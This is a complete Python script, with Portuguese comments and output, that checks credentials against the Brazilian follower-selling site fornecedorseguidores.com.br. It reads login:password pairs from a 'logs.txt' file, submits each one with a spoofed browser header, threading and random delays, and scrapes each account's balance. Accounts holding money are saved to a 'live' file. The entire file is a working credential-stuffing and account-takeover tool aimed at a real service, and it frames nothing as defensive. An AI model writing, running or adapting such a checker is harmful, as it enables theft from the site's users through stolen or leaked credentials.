import requests
from bs4 import BeautifulSoup
import re
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
import os
import threading

init(autoreset=True)

# Configurações
URL = 'https://fornecedorseguidores.com.br'
MAX_THREADS = 5
DELAY = (1, 3)
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
ERROR_FILE = 'erros.txt'

# Variáveis globais
stats = {
    'total': 0,
    'com_saldo': 0,
    'sem_saldo': 0,
    'erros': 0,
    'start_time': time.time(),
    'running': True
}

def update_panel():
    while stats['running']:
        elapsed = time.time() - stats['start_time']
        print("\033[H\033[J", end='')  # Limpa o terminal
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.YELLOW + "  FORNECEDOR SEGUIDORES CHECKER")
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.GREEN + f" ✅ COM SALDO: {stats['com_saldo']}")
        print(Fore.WHITE + f" ❌ SEM SALDO: {stats['sem_saldo']}")
        print(Fore.RED + f" ⚠ ERROS: {stats['erros']}")
        print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
        print(Fore.CYAN + "══════════════════════════════════", end='\r')
        time.sleep(0.1)  # Atualiza a cada 0.1 segundos

def read_credentials():
    credentials = []
    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as file:
            for line in file:
                if ':' in line:
                    login, password = line.strip().split(':', 1)
                    credentials.append((login.strip(), password.strip()))
        stats['total'] = len(credentials)
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
    return credentials

def random_delay():
    time.sleep(random.uniform(*DELAY))

def check_balance(account):
    username, password = account
    session = requests.Session()
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Referer': URL,
    }

    data = {
        'username': username,
        'password': password,
    }

    try:
        response = session.post(URL, headers=headers, data=data, timeout=15)
        response.raise_for_status()

        if 'Como Comprar' not in response.text:
            stats['sem_saldo'] += 1
            save_result(DIE_FILE, username, password, "Login falhou")
            return f"{Fore.WHITE}❌ SEM SALDO - {username}:{password} - Login falhou"

        soup = BeautifulSoup(response.text, 'html.parser')
        saldo = None
        
        for p_tag in soup.find_all('p', class_='MuiTypography-root'):
            text = p_tag.get_text(strip=True)
            match = re.search(r'R\$\s*([\d,\.]+)', text)
            if match:
                saldo = match.group(1).replace('.', '').replace(',', '.')
                break

        if not saldo:
            stats['sem_saldo'] += 1
            save_result(DIE_FILE, username, password, "Saldo não encontrado")
            return f"{Fore.WHITE}❌ SEM SALDO - {username}:{password} - Saldo não encontrado"

        saldo_float = float(saldo)
        
        if saldo_float > 0:
            stats['com_saldo'] += 1
            save_result(LIVE_FILE, username, password, f"Saldo: R${saldo.replace('.', ',')}")
            return f"{Fore.GREEN}✅ COM SALDO - {username}:{password} - Saldo: R${Fore.GREEN}{saldo.replace('.', ',')}"
        else:
            stats['sem_saldo'] += 1
            save_result(DIE_FILE, username, password, "Saldo zerado")
            return f"{Fore.WHITE}❌ SEM SALDO - {username}:{password} - Saldo: R$0,00"

    except requests.exceptions.RequestException as e:
        stats['erros'] += 1
        save_result(ERROR_FILE, username, password, str(e))
        return f"{Fore.RED}⚠ ERRO - {username}:{password} - {str(e)[:50]}"

    except Exception as e:
        stats['erros'] += 1
        save_result(ERROR_FILE, username, password, str(e))
        return f"{Fore.RED}⚠ ERRO - {username}:{password} - Erro desconhecido"

def save_result(filename, username, password, extra_info=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{username}:{password}"
            if extra_info:
                line += f" | {extra_info}"
            f.write(line + "\n")
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar resultado: {e}")

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    for file in [LIVE_FILE, DIE_FILE, ERROR_FILE]:
        if os.path.exists(file):
            os.remove(file)

    credentials = read_credentials()
    if not credentials:
        print(Fore.RED + "Nenhuma credencial válida encontrada!")
        return

    # Inicia a thread de atualização do painel
    panel_thread = threading.Thread(target=update_panel)
    panel_thread.daemon = True
    panel_thread.start()

    # Verificar contas com threads
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for account in credentials:
            futures.append(executor.submit(check_balance, account))
            random_delay()

        for future in as_completed(futures):
            print(future.result())  # Mostra o resultado de cada conta

    # Finaliza a thread de atualização
    stats['running'] = False
    panel_thread.join()

    print(Fore.CYAN + "\n✅ Verificação concluída!")
    print(Fore.GREEN + f"Contas com saldo: {LIVE_FILE}")
    print(Fore.WHITE + f"Contas sem saldo: {DIE_FILE}")
    print(Fore.RED + f"Erros: {ERROR_FILE}")

if __name__ == "__main__":
    main()